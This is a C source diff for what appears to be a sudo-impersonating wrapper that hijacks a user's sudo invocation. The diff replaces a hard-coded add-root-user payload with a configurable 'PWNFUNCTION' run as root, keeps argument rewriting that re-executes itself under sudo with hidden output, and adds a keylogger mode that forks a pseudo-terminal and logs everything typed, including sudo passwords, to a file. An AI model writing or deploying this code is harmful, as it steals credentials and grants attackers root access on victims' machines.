@@ -1,6 +1,5 @@
 #include "tas/tas.h"
 #include "tas/constructor.c"
-#include "fun/add-root-user.c"
 
 #include <stdio.h>
 #include <string.h>
@@ -8,6 +7,12 @@
 #include <sys/types.h>
 #include <fcntl.h>
 
+#include "config.h"
+
+// if you enable command change
+#ifdef CMDCHANGE
+
+// verify command line
 int check_args(int argc, char **argv)
 {
 	if (argc <= 1) {
@@ -28,9 +33,11 @@ end:
 // what you want as root
 void super(void)
 {
-	add_root_user();
+	// defined in config.h
+	PWNFUNCTION
 }
 
+// hide output
 void prepare(void)
 {
 	int fd;
@@ -64,7 +71,6 @@ void runme(int argc, char **argv)
 	}
 
 	if (check_args(argc, argv)) {
-		// change
 		tas_execv("sudo", argv);
 		_exit(0);
 	}
@@ -73,7 +79,6 @@ void runme(int argc, char **argv)
 		// don't care about overwrite the argc
 		argv[-1] = argv[0];
 		argv[0] = current_exe;
-		argv[1] = getfullpath(argv[1]);
 
 		// human readable
 		argv--;
@@ -83,7 +88,68 @@ void runme(int argc, char **argv)
 	_exit(0);
 }
 
+#endif /* CMDCHANGE */
+
+// if you enable keylogger
+#ifdef KEYLOGGER
+
+int enable_keylogger(int argc, char **argv)
+{
+	struct termios tios;
+	int status;
+
+	tas_tty tty = TAS_TTY_INIT;
+	tty.output_fd = open(LOGFILE, O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC , 0644);
+
+	if(tty.output_fd == -1) {
+		#ifdef CMDCHANGE
+			runme(argc, argv);
+		#else
+			tas_execv("sudo", argv);
+		#endif
+
+		_exit(1);
+	}
+
+	pid_t pid = tas_forkpty(&tty);
+	if (pid <= 0) {
+		if (pid == -1)
+			close(tty.master);
+
+		#ifdef CMDCHANGE
+			runme(argc, argv);
+		#else
+			tas_execv("sudo", argv);
+		#endif
+
+		_exit(1);
+	}
+
+	tty.input_hook = (void *) keylogger;
+	tty.stdin_fd = STDIN_FILENO;
+
+	// set to raw mode
+	raw_mode(&tios, STDIN_FILENO);
+
+	// rw loop
+	tty_loop(&tty);
+
+	// restore
+	tcsetattr(STDIN_FILENO, TCSAFLUSH, &tios);
+
+	waitpid(pid, &status, 0);
+	return status;
+}
+
+#endif /* KEYLOGGER */
+
 int main(int argc, char **argv)
 {
+#ifdef KEYLOGGER
+	return enable_keylogger(argc, argv);
+#endif
+
+#ifdef CMDCHANGE
 	runme(argc, argv);
+#endif
 }
